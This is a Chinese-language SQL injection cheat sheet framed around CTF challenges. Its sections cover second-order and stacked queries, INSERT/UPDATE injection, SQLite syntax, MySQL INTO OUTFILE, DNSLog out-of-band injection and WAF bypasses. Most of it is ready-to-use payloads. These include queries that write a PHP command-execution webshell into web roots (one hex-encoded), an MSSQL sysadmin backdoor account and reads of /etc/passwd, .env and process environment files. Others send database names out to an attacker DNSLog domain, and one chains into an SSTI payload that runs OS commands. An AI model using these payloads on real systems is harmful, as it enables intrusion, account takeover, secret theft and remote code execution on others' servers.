# SQL 注入高级技术

## 二次注入 (Second-Order Injection)

**原理**：注入 payload 首次输入时被转义存入数据库，但后续查询从数据库取出时**未再次转义**，导致 SQL 注入。

**典型场景**：注册用户名 → 修改密码时触发

```
Step 1: 注册用户名为 admin'--
  INSERT INTO users VALUES('admin''--', 'mypass')  ← 转义存入，安全

Step 2: 修改密码
  UPDATE users SET password='newpass' WHERE username='admin'--'
  → 实际执行: UPDATE users SET password='newpass' WHERE username='admin'
  → admin 的密码被改为 newpass！
```

### 利用流程

```
1. 注册: username = admin'-- , password = 任意
2. 登录注册的账号
3. 修改密码为已知值（如 test123）
4. 用 admin / test123 登录 → 成功获取 admin 权限
```

### sqlmap 二次注入

```bash
timeout 480 sqlmap -u 'http://target/register' \
    --data 'username=test&password=pass' \
    --second-url 'http://target/profile' \
    --batch --level 3 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## 堆叠注入 (Stacked Queries)

**原理**：用分号 `;` 分隔多条 SQL 语句，执行任意 SQL。

**支持情况**：

| 数据库 | 堆叠注入支持 | 条件 |
|--------|-------------|------|
| MySQL | `mysqli_multi_query()` 才支持 | `mysql_query()` 不支持 |
| MSSQL | ✅ 默认支持 | - |
| PostgreSQL | ✅ 默认支持 | - |
| SQLite | ✅ 默认支持 | - |
| Oracle | ❌ 不支持 | - |

### 检测

```sql
'; SELECT SLEEP(3);--     -- MySQL
'; WAITFOR DELAY '0:0:3';--  -- MSSQL
'; SELECT pg_sleep(3);--  -- PostgreSQL
```

### 利用（绕过 SELECT 限制）

```sql
-- 如果只允许 SELECT，用堆叠执行其他操作

-- 读取其他表
';SELECT flag FROM flag_table;--

-- 写文件
';SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';--

-- 创建用户（MSSQL）
';EXEC sp_addlogin 'hacker','password';--
';EXEC sp_addsrvrolemember 'hacker','sysadmin';--

-- 修改数据
';UPDATE users SET role='admin' WHERE username='myuser';--
```

### CTF 常见：堆叠注入 + HANDLER (MySQL)

当 `select` 被过滤时：

```sql
'; HANDLER flag_table OPEN;
'; HANDLER flag_table READ FIRST;
'; HANDLER flag_table CLOSE;--

-- 或 PREPARE + EXECUTE 绕过关键字过滤
';SET @sql=CONCAT('sel','ect flag from flag');PREPARE stmt FROM @sql;EXECUTE stmt;--
```

---

## INSERT/UPDATE 注入

### INSERT 注入

```sql
-- 原始: INSERT INTO users(username, password) VALUES('INPUT', 'pass')

-- 注入第二条记录（添加 admin）
test', 'pass'), ('admin', 'hacked')--

-- 报错注入（在 INSERT 中用 EXTRACTVALUE）
test' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND '1'='1

-- 布尔盲注（通过注册是否成功判断）
test' AND (SELECT ASCII(SUBSTRING(flag,1,1)) FROM flag)>70 AND '1'='1
```

### UPDATE 注入

```sql
-- 原始: UPDATE users SET email='INPUT' WHERE id=5

-- 修改其他字段
test', role='admin' WHERE username='myuser'--

-- 修改其他用户（越权）
test' WHERE username='admin'--

-- 报错注入
test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flag))) AND '1'='1
```

### 识别特征

- 注册/修改资料等写操作的参数
- 注入 `'` 后出现数据库错误（但可能不影响页面显示）
- 有时需要检查数据库中是否写入了异常数据来判断注入结果

---

## SQLite 注入语法

SQLite 与 MySQL 语法差异大，在 CTF 中常见。

### 系统表不同

```sql
-- MySQL: information_schema
SELECT table_name FROM information_schema.tables

-- SQLite: sqlite_master
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'  -- 获取建表语句
```

### UNION 注入

```sql
' UNION SELECT 1,2,3 FROM sqlite_master--
' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,flag,3 FROM flag_table--
```

### SQLite 特有函数

```sql
-- 版本
SELECT sqlite_version()

-- 字符串拼接用 ||（不是 CONCAT）
SELECT 'a' || 'b'

-- SUBSTRING → SUBSTR
SELECT SUBSTR(flag,1,1) FROM flag

-- 无 SLEEP()，用 randomblob() 做时间盲注（较慢）
SELECT CASE WHEN (SUBSTR(flag,1,1)='f') THEN randomblob(100000000) ELSE 0 END FROM flag

-- 无 EXTRACTVALUE/UPDATEXML → 无法报错注入，只能 UNION 或盲注
```

### SQLite 布尔盲注

```sql
' AND (SELECT SUBSTR(flag,1,1) FROM flag_table)='f'--
' AND (SELECT unicode(SUBSTR(flag,POS,1)) FROM flag_table)>70--
```

### SQLite 写文件（需要 ATTACH）

```sql
'; ATTACH DATABASE '/var/www/html/shell.php' AS pwned;
CREATE TABLE pwned.x (data TEXT);
INSERT INTO pwned.x VALUES('<?php system($_GET["cmd"]); ?>');--
```

---

## INTO OUTFILE 写 Shell (MySQL)

**条件**：
1. MySQL 用户有 `FILE` 权限
2. `secure_file_priv` 为空或包含目标路径
3. 知道 Web 根目录路径

### 检测权限

```sql
-- 检查 secure_file_priv
' UNION SELECT 1,@@secure_file_priv,3--
-- 空字符串 = 不限制，NULL = 禁止，路径 = 限制到该路径

-- 检查 FILE 权限
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
```

### 写 Webshell

```sql
-- 基础写入
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--

-- DUMPFILE（写二进制文件、无行尾换行）
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'--

-- 十六进制编码绕过引号过滤
' UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,3 INTO OUTFILE '/var/www/html/shell.php'--
```

### 常见 Web 根路径

| 系统/服务 | 路径 |
|-----------|------|
| Apache (Debian/Ubuntu) | `/var/www/html/` |
| Apache (CentOS) | `/var/www/html/` |
| Nginx | `/usr/share/nginx/html/` |
| Tomcat | `/usr/local/tomcat/webapps/ROOT/` |
| IIS | `C:\inetpub\wwwroot\` |
| XAMPP | `/opt/lampp/htdocs/` |
| Docker 常见 | `/app/`, `/var/www/` |

### 读取文件

```sql
-- LOAD_FILE 读取
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,LOAD_FILE('/flag.txt'),3--

-- 常用目标
/etc/passwd
/var/www/html/config.php
/var/www/html/.env
/proc/self/environ
```

---

## DNSLOG 带外注入 (OOB)

当无回显、无报错、无时间差异时的最后手段：

```sql
-- MySQL (Windows only, 需要 FILE 权限)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.dnslog.cn\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\'+db_name()+'.attacker.dnslog.cn\a'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://'||user||'.attacker.dnslog.cn') FROM DUAL--
```

DNSLog 平台：`ceye.io`、`dnslog.cn`、`interact.sh`

---

## CTF 高级 SQLi 技巧补充

### 反斜杠逃逸引号绕过
当两个参数拼入同一 SQL（如 `username='$u' AND password='$p'`），在第一个参数末尾注入 `\` 吞掉闭合引号，使第二个参数变成可控 SQL：
```bash
curl -d 'username=\&password= OR 1=1-- '
# 结果: WHERE username='\' AND password=' OR 1=1-- '
#                         ^^^^^^^^^^^^^ 第一个字符串延伸到此
```

### MySQL 列截断（VARCHAR 绕过）
MySQL `VARCHAR(N)` 静默截断超长字符串，且比较时忽略尾部空格。注册 `"admin" + 空格填充 + 垃圾字符` 可创建与 admin 同名的重复行：
```sql
-- VARCHAR(20) → 注册用户名: admin               x
-- MySQL 截断为 "admin               " → 匹配 "admin"
```

### INSERT ON DUPLICATE KEY UPDATE 密码覆写
当只能注入 INSERT 语句时，利用 UNIQUE 约束冲突更新已有用户密码：
```sql
-- 注入到 username 字段:
'),('','admin','z') ON DUPLICATE KEY UPDATE password='hacked'#
```

### innodb_table_stats 替代 information_schema
WAF 拦截 `information_schema` 时用 `mysql.innodb_table_stats` 枚举表名：
```sql
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
```

### SQLi → SSTI 链式攻击
当 SQLi 结果被模板引擎渲染时，注入 SSTI payload（用 hex 编码绕过引号过滤）：
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
hex_payload = '0x' + payload.encode().hex()
# username=x\&password=) union select 1, {hex_payload}#
```

### MySQL REGEXP 逐字节 Oracle
`REGEXP` 作为盲注布尔 Oracle，WAF 通常不拦截：
```sql
-- 逐字符匹配: pw REGEXP '^a' → True/False
/?user=`\`&pw=`||pw/**/REGEXP/**/"^a"
```

### PHP PCRE 回溯限制绕过 WAF
`preg_match()` 在回溯超过 100 万次时返回 `false`（非 `0`），大多数代码用 `if (!preg_match(...))` 判断导致绕过：
```python
payload = "union select 1,2,3-- " + "a" * 1000001
```
